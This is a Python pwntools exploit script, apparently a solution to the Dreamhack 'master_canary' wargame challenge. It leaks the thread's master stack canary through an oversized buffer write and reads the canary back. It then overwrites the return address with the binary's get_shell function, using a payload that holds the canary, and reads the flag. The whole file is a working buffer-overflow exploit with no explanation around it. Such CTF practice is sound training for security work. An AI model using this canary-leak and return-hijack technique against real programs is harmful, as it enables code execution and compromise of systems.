#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 8534
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./master_canary', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000400C15
            b* 0x0000000000400C5A
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def create_thread():
    p.sendlineafter(b'> ', str(1))

def add(size, data):
    p.sendlineafter(b'> ', str(2))
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Data: ', data)

def comment(data):
    p.sendlineafter(b'> ', str(3))
    p.sendafter(b'comment: ', data)

# VARIABLE


# PAYLOAD
create_thread()
add(0x8e9, b'a'*0x8e9)
p.recvuntil(b'a'*0x8e9)
canary = u64(b'\0' + p.recv(7))
print("Canary: " + hex(canary))
# GDB()
payload = flat(
    b'a'*0x28,
    canary,
    b'a'*8,
    exe.sym.get_shell
    )
comment(payload)
p.sendline(b'cat flag')

p.interactive()